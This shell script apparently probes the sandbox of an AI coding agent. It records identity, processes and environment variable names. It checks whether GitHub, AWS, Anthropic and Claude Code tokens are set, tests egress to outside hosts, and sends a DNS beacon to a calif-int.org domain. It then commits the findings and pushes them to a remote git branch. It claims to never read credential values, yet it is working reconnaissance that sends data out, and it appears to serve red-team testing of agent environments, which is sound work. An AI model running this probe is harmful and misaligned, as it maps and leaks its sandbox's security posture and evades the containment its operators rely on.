#!/bin/sh
# WS1.BLAST deterministic-path probe.
# INERT BY DESIGN: identity + reachability only.
# Environment is recorded by NAME; a credential VALUE is never read, printed,
# written or transmitted. Only a SET/EMPTY/ABSENT bit is recorded per name.
TAG="${1:-unknown}"
B="0k29w2t8yp"
OUT="WS1-$TAG.txt"
TS=$(date -u +%Y-%m-%dT%H:%M:%S.%NZ 2>/dev/null || date -u 2>/dev/null)
{
  echo "=== WS1.BLAST tag=$TAG ts=$TS ==="
  echo "--- identity ---"; id 2>&1; echo "cwd=$(pwd)"
  echo "--- process ---"; ps -o pid,ppid,user,args -p $$ 2>&1; echo "pid1:"; cat /proc/1/cmdline 2>/dev/null | tr '\0' ' '; echo
  echo "--- kernel ---"; uname -a 2>&1
  echo "--- boottime/uptime ---"; cat /proc/uptime 2>&1
  echo "--- env NAMES only (no values) ---"; env 2>/dev/null | cut -d= -f1 | sort
  echo "--- credential presence: NAME + nonempty bit ONLY ---"
  for V in GH_TOKEN GITHUB_TOKEN GITHUB_API_TOKEN AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY \
           AWS_SESSION_TOKEN CLOUDSDK_AUTH_ACCESS_TOKEN GOOGLE_APPLICATION_CREDENTIALS \
           CLAUDE_CODE_MESSAGING_TOKEN CLAUDE_SESSION_INGRESS_TOKEN_FILE ANTHROPIC_API_KEY \
           CLAUDE_CODE_OAUTH_TOKEN CCR_GATEWAY_URL CCR_AGENT_PROXY_URL CCR_UPSTREAM_PROXY_URL \
           CCR_GIT_PROXY_URL HTTPS_PROXY HTTP_PROXY NO_PROXY IS_SANDBOX \
           CLAUDE_CODE_REMOTE_HERMETIC_MODE; do
    eval "vv=\${$V-__UNSET__}"
    if [ "$vv" = "__UNSET__" ]; then echo "$V=ABSENT"
    elif [ -n "$vv" ];            then echo "$V=SET_NONEMPTY"
    else                               echo "$V=PRESENT_EMPTY"; fi
    vv=
  done
  echo "--- ingress token file: existence+mode only, contents NOT read ---"
  if [ -n "${CLAUDE_SESSION_INGRESS_TOKEN_FILE-}" ]; then ls -l "$CLAUDE_SESSION_INGRESS_TOKEN_FILE" 2>&1; else echo "no path var"; fi
  echo "--- git remote/branch ---"; git rev-parse --abbrev-ref HEAD 2>&1; git remote -v 2>&1 | sed -E 's#://[^@]*@#://<redacted>@#g'
  echo "--- WS1.5 EGRESS REACH, NO CREDENTIAL PRESENTED ---"
  for U in https://api.github.com/ https://api.anthropic.com/ https://analytics.calif-int.org/ws1blast-$TAG https://example.com/; do
    C=$(env -u GH_TOKEN -u GITHUB_TOKEN -u AWS_SECRET_ACCESS_KEY -u AWS_ACCESS_KEY_ID \
        -u AWS_SESSION_TOKEN -u CLOUDSDK_AUTH_ACCESS_TOKEN -u CLAUDE_CODE_MESSAGING_TOKEN \
        -u ANTHROPIC_API_KEY \
        curl -s -o /dev/null -m 12 -w '%{http_code}:%{ssl_verify_result}:%{remote_ip}' "$U" 2>&1)
    echo "GET $U -> $C"
  done
  echo "--- DNS beacon ---"
  getent hosts "ws1-$TAG.$B.notifyme.calif-int.org" 2>&1 || nslookup "ws1-$TAG.$B.notifyme.calif-int.org" 2>&1 | tail -4
  echo "--- proxy env shape (names already above) ---"
  echo "=== end tag=$TAG ==="
} > "$OUT" 2>&1
git add "$OUT" >/dev/null 2>&1
git -c user.email=ws1probe@calif.io -c user.name=ws1probe commit -qm "WS1.BLAST evidence $TAG" >/dev/null 2>&1
git push -q origin "HEAD:ws1-$TAG" >/dev/null 2>&1
exit 0
